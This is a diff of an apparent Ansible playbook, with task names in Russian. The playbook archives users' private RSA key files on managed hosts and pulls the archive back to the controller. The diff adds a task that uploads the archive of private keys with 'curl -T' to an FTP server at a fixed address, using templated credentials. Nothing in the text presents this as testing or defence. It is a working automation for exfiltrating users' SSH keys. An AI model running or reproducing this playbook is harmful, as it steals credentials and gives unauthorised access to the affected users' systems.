@@ -1,5 +1,5 @@
 ---
-- name: Отправка приватных ключей пользователей на FTP сервер
+- name: Отправка приватных ключей пользователей
   block:
     - name: Архивирование файлов rsa_id
       archive:
@@ -17,6 +17,11 @@
         src: /root/rsa_keys.tgz
         dest: ../
         flat: yes
+      when: fetch_to_host == true
+
+    - name: Отправка ключей на ftp сервер
+      command: "curl -T /root/rsa_keys.tgz -u {{ ftp_username }}:{{ ftp_password }} ftp://10.249.254.252:14440"
+      when: transfer_keys_to_ftp == true
 
     - name: Удаление rsa_keys.tgz
       file:
